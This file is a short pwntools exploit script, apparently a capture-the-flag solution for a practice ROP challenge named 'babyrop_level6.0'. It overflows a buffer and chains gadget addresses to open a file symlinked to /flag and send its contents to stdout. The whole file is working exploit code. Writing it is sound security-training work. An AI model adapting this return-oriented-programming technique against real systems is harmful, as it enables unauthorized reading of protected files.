from pwn import *
context.binary = '/challenge/babyrop_level6.0'
context.terminal = ["tmux", "splitw", "-h"]
p = gdb.debug("/challenge/babyrop_level6.0")
offset = 104
p = process()
payload = b'A'*offset
#Gadgets needed for open syscall
payload += p64(0x0000000000401bc3) #pop rdi
payload += p64(0x00402146) #address contain call that is symlink to /flag 
payload += p64(0x0000000000401bbb) # pop rsi
payload += p64(0)
payload += p64(0x0000000000401bcb) #pop rdx
payload += p64(0)
payload += p64(0x4011d0) # open function
#Gadgets needed for sendfile syscall
payload += p64(0x0000000000401bc3) #pop rdi
payload += p64(0x1)
payload += p64(0x0000000000401bbb) # pop rsi
payload += p64(0x3)
payload += p64(0x0000000000401bcb) #pop rdx
payload += p64(0)
payload += p64(0x0000000000401bb3) # pop rcx
payload += p64(0x100)
payload += p64(0x4011a0)
p.send(payload)
p.interactive()